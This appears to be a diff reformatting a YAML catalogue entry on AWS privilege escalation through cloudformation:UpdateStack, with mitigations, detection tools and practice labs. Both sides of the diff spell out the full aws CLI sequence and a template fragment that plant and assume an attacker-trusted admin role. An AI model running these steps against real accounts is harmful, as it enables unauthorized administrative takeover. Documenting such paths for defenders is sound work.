@@ -4,10 +4,18 @@ category: access-resource
 services:
 - cloudformation
 - iam
-description: A principal with `cloudformation:UpdateStack` can modify an existing CloudFormation stack that has an administrative service role attached. CloudFormation stacks execute with the permissions of their service role, which often requires elevated privileges to manage infrastructure. By updating the stack template to include new IAM resources (such as an admin role with a trust policy allowing the attacker to assume it), the attacker can leverage the stack's elevated permissions to create resources they couldn't create directly. This is particularly insidious because it appears as legitimate infrastructure management activity.
+description: A principal with `cloudformation:UpdateStack` can modify an existing
+  CloudFormation stack that has an administrative service role attached. CloudFormation
+  stacks execute with the permissions of their service role, which often requires
+  elevated privileges to manage infrastructure. By updating the stack template to
+  include new IAM resources (such as an admin role with a trust policy allowing the
+  attacker to assume it), the attacker can leverage the stack's elevated permissions
+  to create resources they couldn't create directly. This is particularly insidious
+  because it appears as legitimate infrastructure management activity.
 prerequisites:
   admin:
-  - A CloudFormation stack must exist with an administrative service role (e.g., AdministratorAccess or an equivalent custom policy)
+  - A CloudFormation stack must exist with an administrative service role (e.g., AdministratorAccess
+    or an equivalent custom policy)
   - The principal must have permission to update that specific stack
   lateral:
   - A CloudFormation stack must exist with a service role that has elevated permissions
@@ -15,104 +23,94 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: |
-      aws cloudformation describe-stacks \
-        --stack-name TARGET_STACK_NAME \
-        --query 'Stacks[0].[StackName,StackStatus,RoleARN]'
+    command: "aws cloudformation describe-stacks \\\n  --stack-name TARGET_STACK_NAME\
+      \ \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n"
     description: Identify CloudFormation stacks with elevated service roles
   - step: 2
-    command: |
-      aws cloudformation get-template \
-        --stack-name TARGET_STACK_NAME \
-        --query 'TemplateBody'
+    command: "aws cloudformation get-template \\\n  --stack-name TARGET_STACK_NAME\
+      \ \\\n  --query 'TemplateBody'\n"
     description: Retrieve the current stack template
   - step: 3
-    command: |
-      # Create modified template with added IAM role
+    command: '# Create modified template with added IAM role
+
       # Add resource like:
+
       # EscalatedAdminRole:
+
       #   Type: AWS::IAM::Role
+
       #   Properties:
+
       #     RoleName: escalated-admin-role
+
       #     AssumeRolePolicyDocument:
+
       #       Statement:
+
       #         - Effect: Allow
+
       #           Principal:
+
       #             AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER
+
       #           Action: sts:AssumeRole
+
       #     ManagedPolicyArns:
+
       #       - arn:aws:iam::aws:policy/AdministratorAccess
-    description: Modify the template to add an IAM role with admin permissions and a trust policy allowing you to assume it
+
+      '
+    description: Modify the template to add an IAM role with admin permissions and
+      a trust policy allowing you to assume it
   - step: 4
-    command: |
-      aws cloudformation update-stack \
-        --stack-name TARGET_STACK_NAME \
-        --template-body file://modified-template.json \
-        --capabilities CAPABILITY_NAMED_IAM
-    description: Update the CloudFormation stack with the modified template (stack's service role creates the new admin role)
+    command: "aws cloudformation update-stack \\\n  --stack-name TARGET_STACK_NAME\
+      \ \\\n  --template-body file://modified-template.json \\\n  --capabilities CAPABILITY_NAMED_IAM\n"
+    description: Update the CloudFormation stack with the modified template (stack's
+      service role creates the new admin role)
   - step: 5
-    command: |
-      aws cloudformation wait stack-update-complete \
-        --stack-name TARGET_STACK_NAME
+    command: "aws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n"
     description: Wait for the stack update to complete
   - step: 6
-    command: |
-      aws sts assume-role \
-        --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
-        --role-session-name escalation-session
+    command: "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role\
+      \ \\\n  --role-session-name escalation-session\n"
     description: Assume the newly created admin role
   - step: 7
-    command: |
-      # Configure AWS CLI with the temporary credentials from step 6
+    command: '# Configure AWS CLI with the temporary credentials from step 6
+
       # Now you have administrator access
+
       aws iam list-users
+
+      '
     description: Verify administrator access
-recommendation: |
-  Restrict the `cloudformation:UpdateStack` permission using the principle of least privilege.
+recommendation: "Restrict the `cloudformation:UpdateStack` permission using the principle\
+  \ of least privilege.\n\nUse IAM policy conditions to restrict which stacks can\
+  \ be updated:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"cloudformation:UpdateStack\"\
+  ,\n  \"Resource\": \"arn:aws:cloudformation:*:*:stack/approved-stack-name/*\",\n\
+  \  \"Condition\": {\n    \"StringEquals\": {\n      \"cloudformation:StackId\":\
+  \ \"arn:aws:cloudformation:*:*:stack/approved-stack/*\"\n    }\n  }\n}\n```\n\n\
+  Additional controls:\n- Implement least privilege principles for CloudFormation\
+  \ service roles - avoid granting AdministratorAccess when more granular permissions\
+  \ suffice\n- Use CloudFormation stack policies to prevent modifications to sensitive\
+  \ resources:\n  ```json\n  {\n    \"Statement\": [\n      {\n        \"Effect\"\
+  : \"Deny\",\n        \"Principal\": \"*\",\n        \"Action\": \"Update:*\",\n\
+  \        \"Resource\": \"LogicalResourceId/SensitiveRole\"\n      }\n    ]\n  }\n\
+  \  ```\n- Implement Service Control Policies (SCPs) to restrict CloudFormation stack\
+  \ updates that create or modify IAM resources\n- Monitor CloudTrail for `UpdateStack`\
+  \ API calls, especially those that modify stacks with elevated service roles\n-\
+  \ Enable CloudFormation drift detection and alerts to identify unauthorized stack\
+  \ modifications\n- Require MFA for CloudFormation updates using condition keys like\
+  \ `aws:MultiFactorAuthPresent`\n- Use IAM Access Analyzer to identify and remediate\
+  \ privilege escalation paths involving CloudFormation permissions\n- Implement change\
+  \ approval workflows for CloudFormation stack updates that modify IAM resources\n\
+  - Regularly audit CloudFormation service roles and reduce permissions to the minimum\
+  \ required for stack operations\n"
+limitations: 'This path provides administrative access only if the existing stack''s
+  service role has administrative permissions. If the service role has limited permissions,
+  the attacker gains access limited to those permissions. However, even limited access
+  may enable multi-hop attacks.
 
-  Use IAM policy conditions to restrict which stacks can be updated:
-
-  ```json
-  {
-    "Effect": "Allow",
-    "Action": "cloudformation:UpdateStack",
-    "Resource": "arn:aws:cloudformation:*:*:stack/approved-stack-name/*",
-    "Condition": {
-      "StringEquals": {
-        "cloudformation:StackId": "arn:aws:cloudformation:*:*:stack/approved-stack/*"
-      }
-    }
-  }
-  ```
-
-  Additional controls:
-  - Implement least privilege principles for CloudFormation service roles - avoid granting AdministratorAccess when more granular permissions suffice
-  - Use CloudFormation stack policies to prevent modifications to sensitive resources:
-    ```json
-    {
-      "Statement": [
-        {
-          "Effect": "Deny",
-          "Principal": "*",
-          "Action": "Update:*",
-          "Resource": "LogicalResourceId/SensitiveRole"
-        }
-      ]
-    }
-    ```
-  - Implement Service Control Policies (SCPs) to restrict CloudFormation stack updates that create or modify IAM resources
-  - Monitor CloudTrail for `UpdateStack` API calls, especially those that modify stacks with elevated service roles
-  - Enable CloudFormation drift detection and alerts to identify unauthorized stack modifications
-  - Require MFA for CloudFormation updates using condition keys like `aws:MultiFactorAuthPresent`
-  - Use IAM Access Analyzer to identify and remediate privilege escalation paths involving CloudFormation permissions
-  - Implement change approval workflows for CloudFormation stack updates that modify IAM resources
-  - Regularly audit CloudFormation service roles and reduce permissions to the minimum required for stack operations
-limitations: |
-  This path provides administrative access only if the existing stack's service role has administrative permissions. If the service role has limited permissions, the attacker gains access limited to those permissions. However, even limited access may enable multi-hop attacks.
-discoveredBy:
-  name: Erik Steringer
-  organization: NCC Group
-  date: "2019"
+  '
 discoveryAttribution:
   firstDocumented:
     author: Erik Steringer
@@ -121,7 +119,8 @@ discoveryAttribution:
     link: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L85-L113
   derivativeOf:
     pathId: cloudformation-001
-    modification: "Uses cloudformation:UpdateStack instead of cloudformation:CreateStack to modify an existing stack with an administrative service role"
+    modification: Uses cloudformation:UpdateStack instead of cloudformation:CreateStack
+      to modify an existing stack with an administrative service role
   ultimateOrigin:
     pathId: cloudformation-001
     author: Spencer Gietzen
@@ -150,7 +149,8 @@ relatedPaths:
 permissions:
   required:
   - permission: cloudformation:UpdateStack
-    resourceConstraints: Must have permission to update the target CloudFormation stack
+    resourceConstraints: Must have permission to update the target CloudFormation
+      stack
   additional:
   - permission: cloudformation:DescribeStacks
     resourceConstraints: Helpful for identifying stacks with elevated service roles
@@ -164,148 +164,140 @@ learningEnvironments:
   pathfinder-labs:
     type: open-source
     githubLink: https://github.com/DataDog/pathfinder-labs
-    scenario: "privesc-one-hop/to-admin/cloudformation-updatestack"
-    description: "Deploy Terraform into your own AWS account to practice this attack path"
+    scenario: privesc-one-hop/to-admin/cloudformation-updatestack
+    description: Deploy Terraform into your own AWS account to practice this attack
+      path
   iam-vulnerable:
     type: open-source
     githubLink: https://github.com/BishopFox/iam-vulnerable
-    scenario: "CloudFormation-UpdateStack"
-    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths (requires CloudFormation non-free module, ~$0.40/month)"
+    scenario: CloudFormation-UpdateStack
+    description: Deploy Terraform into your own AWS account and practice individual
+      exploitation paths (requires CloudFormation non-free module, ~$0.40/month)
 detectionTools:
-  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L106-L138
+  pmapper: https://github.com/nccgroup/PMapper/blob/91d2e60102bdadf346d77b60d90ddaa4a678f037/principalmapper/graphing/cloudformation_edges.py#L149
 attackVisualization:
   nodes:
   - id: start
     label: Starting Principal
     type: principal
-    description: |
-      The starting principal (user or role) with `cloudformation:UpdateStack` permission on the target stack. This principal can modify the stack template to add new AWS resources that will be created with the stack's service role permissions.
+    description: 'The starting principal (user or role) with `cloudformation:UpdateStack`
+      permission on the target stack. This principal can modify the stack template
+      to add new AWS resources that will be created with the stack''s service role
+      permissions.
 
+      '
   - id: existing_stack
     label: Existing CloudFormation Stack
     type: resource
-    description: |
-      An existing CloudFormation stack with an administrative service role attached. The stack's service role typically has elevated permissions (e.g., AdministratorAccess) to manage infrastructure resources. The attacker has permission to update this specific stack through `cloudformation:UpdateStack`.
+    description: 'An existing CloudFormation stack with an administrative service
+      role attached. The stack''s service role typically has elevated permissions
+      (e.g., AdministratorAccess) to manage infrastructure resources. The attacker
+      has permission to update this specific stack through `cloudformation:UpdateStack`.
 
+      '
   - id: stack_role
     label: Stack's Administrative Service Role
     type: principal
-    description: |
-      The IAM role attached to the CloudFormation stack as its service role. This role trusts cloudformation.amazonaws.com and has administrative permissions required to manage infrastructure. When the stack is updated, CloudFormation uses this role's permissions to create, modify, or delete resources defined in the template.
+    description: 'The IAM role attached to the CloudFormation stack as its service
+      role. This role trusts cloudformation.amazonaws.com and has administrative permissions
+      required to manage infrastructure. When the stack is updated, CloudFormation
+      uses this role''s permissions to create, modify, or delete resources defined
+      in the template.
 
+      '
   - id: update_template
     label: Update Stack Template
     type: payload
     color: '#99ccff'
-    description: |
-      The attacker modifies the stack template to add a new IAM role resource with administrative permissions and a trust policy allowing the attacker to assume it. The modified template is then applied to the stack using `cloudformation:UpdateStack`.
+    description: 'The attacker modifies the stack template to add a new IAM role resource
+      with administrative permissions and a trust policy allowing the attacker to
+      assume it. The modified template is then applied to the stack using `cloudformation:UpdateStack`.
+
 
       The new IAM role typically includes:
-      - `AssumeRolePolicyDocument` with trust policy allowing the attacker's principal to assume it
+
+      - `AssumeRolePolicyDocument` with trust policy allowing the attacker''s principal
+      to assume it
+
       - `ManagedPolicyArns` including arn:aws:iam::aws:policy/AdministratorAccess
+
       - Or inline policies granting administrative permissions
 
-      This appears as legitimate infrastructure management activity, making it harder to detect than direct IAM modifications.
 
+      This appears as legitimate infrastructure management activity, making it harder
+      to detect than direct IAM modifications.
+
+      '
   - id: new_admin_role
     label: Newly Created Admin Role
     type: principal
-    description: |
-      The new IAM role created by the CloudFormation stack update. This role has administrative permissions (AdministratorAccess or equivalent) and a trust policy that allows the starting principal to assume it. The role is created using the stack's administrative service role permissions, bypassing the starting principal's limited IAM permissions.
+    description: 'The new IAM role created by the CloudFormation stack update. This
+      role has administrative permissions (AdministratorAccess or equivalent) and
+      a trust policy that allows the starting principal to assume it. The role is
+      created using the stack''s administrative service role permissions, bypassing
+      the starting principal''s limited IAM permissions.
 
+      '
   - id: admin_outcome
     label: Effective Administrator
     type: outcome
-    description: |
-      The attacker successfully assumes the newly created admin role and gains full administrative access to the AWS account. The privilege escalation is complete.
+    description: 'The attacker successfully assumes the newly created admin role and
+      gains full administrative access to the AWS account. The privilege escalation
+      is complete.
 
+      '
   edges:
   - from: start
     to: existing_stack
     label: cloudformation:UpdateStack
-    description: |
-      The attacker identifies a CloudFormation stack with an administrative service role and uses `cloudformation:UpdateStack` to modify the stack template. This requires permission to update the specific stack.
-
-      First, identify target stacks with elevated service roles:
-      ```bash
-      aws cloudformation describe-stacks \
-        --stack-name TARGET_STACK_NAME \
-        --query 'Stacks[0].[StackName,StackStatus,RoleARN]'
-      ```
-
-      Then retrieve the current template:
-      ```bash
-      aws cloudformation get-template \
-        --stack-name TARGET_STACK_NAME \
-        --query 'TemplateBody'
-      ```
-
+    description: "The attacker identifies a CloudFormation stack with an administrative\
+      \ service role and uses `cloudformation:UpdateStack` to modify the stack template.\
+      \ This requires permission to update the specific stack.\n\nFirst, identify\
+      \ target stacks with elevated service roles:\n```bash\naws cloudformation describe-stacks\
+      \ \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n\
+      ```\n\nThen retrieve the current template:\n```bash\naws cloudformation get-template\
+      \ \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'TemplateBody'\n```\n"
   - from: existing_stack
     to: stack_role
     label: Stack uses service role
-    description: |
-      The CloudFormation stack is configured to use an administrative IAM role as its service role. All resource creation, modification, and deletion operations performed by the stack execute with this role's permissions. This is the key to the privilege escalation - the attacker leverages the stack's elevated permissions to create resources they couldn't create directly.
+    description: 'The CloudFormation stack is configured to use an administrative
+      IAM role as its service role. All resource creation, modification, and deletion
+      operations performed by the stack execute with this role''s permissions. This
+      is the key to the privilege escalation - the attacker leverages the stack''s
+      elevated permissions to create resources they couldn''t create directly.
 
+      '
   - from: stack_role
     to: update_template
     label: Modify template
-    description: |
-      The attacker creates a modified version of the stack template that adds a new IAM role resource with administrative permissions. The new role includes a trust policy allowing the attacker's principal to assume it.
-
-      Example IAM role resource to add to template:
-      ```yaml
-      EscalatedAdminRole:
-        Type: AWS::IAM::Role
-        Properties:
-          RoleName: escalated-admin-role
-          AssumeRolePolicyDocument:
-            Statement:
-              - Effect: Allow
-                Principal:
-                  AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER
-                Action: sts:AssumeRole
-          ManagedPolicyArns:
-            - arn:aws:iam::aws:policy/AdministratorAccess
-      ```
-
+    description: "The attacker creates a modified version of the stack template that\
+      \ adds a new IAM role resource with administrative permissions. The new role\
+      \ includes a trust policy allowing the attacker's principal to assume it.\n\n\
+      Example IAM role resource to add to template:\n```yaml\nEscalatedAdminRole:\n\
+      \  Type: AWS::IAM::Role\n  Properties:\n    RoleName: escalated-admin-role\n\
+      \    AssumeRolePolicyDocument:\n      Statement:\n        - Effect: Allow\n\
+      \          Principal:\n            AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER\n\
+      \          Action: sts:AssumeRole\n    ManagedPolicyArns:\n      - arn:aws:iam::aws:policy/AdministratorAccess\n\
+      ```\n"
   - from: update_template
     to: new_admin_role
     label: Stack creates new admin role
-    description: |
-      Update the stack with the modified template. The stack's administrative service role executes the template and creates the new IAM role with admin permissions.
-
-      Command:
-      ```bash
-      aws cloudformation update-stack \
-        --stack-name TARGET_STACK_NAME \
-        --template-body file://modified-template.json \
-        --capabilities CAPABILITY_NAMED_IAM
-      ```
-
-      Wait for the update to complete:
-      ```bash
-      aws cloudformation wait stack-update-complete \
-        --stack-name TARGET_STACK_NAME
-      ```
-
-      The `--capabilities CAPABILITY_NAMED_IAM` flag is required when the template creates IAM resources with custom names.
-
+    description: "Update the stack with the modified template. The stack's administrative\
+      \ service role executes the template and creates the new IAM role with admin\
+      \ permissions.\n\nCommand:\n```bash\naws cloudformation update-stack \\\n  --stack-name\
+      \ TARGET_STACK_NAME \\\n  --template-body file://modified-template.json \\\n\
+      \  --capabilities CAPABILITY_NAMED_IAM\n```\n\nWait for the update to complete:\n\
+      ```bash\naws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n\
+      ```\n\nThe `--capabilities CAPABILITY_NAMED_IAM` flag is required when the template\
+      \ creates IAM resources with custom names.\n"
   - from: new_admin_role
     to: admin_outcome
     label: sts:AssumeRole
-    description: |
-      The attacker assumes the newly created admin role using `sts:AssumeRole`. The role's trust policy explicitly allows the attacker's principal to assume it, and the role has administrative permissions.
-
-      Command:
-      ```bash
-      aws sts assume-role \
-        --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
-        --role-session-name escalation-session
-      ```
-
-      Configure the AWS CLI with the temporary credentials from the assume-role response, then verify administrative access:
-      ```bash
-      aws iam list-users
-      ```
-
-      The attacker now has full administrative access to the AWS account.
+    description: "The attacker assumes the newly created admin role using `sts:AssumeRole`.\
+      \ The role's trust policy explicitly allows the attacker's principal to assume\
+      \ it, and the role has administrative permissions.\n\nCommand:\n```bash\naws\
+      \ sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role\
+      \ \\\n  --role-session-name escalation-session\n```\n\nConfigure the AWS CLI\
+      \ with the temporary credentials from the assume-role response, then verify\
+      \ administrative access:\n```bash\naws iam list-users\n```\n\nThe attacker now\
+      \ has full administrative access to the AWS account.\n"
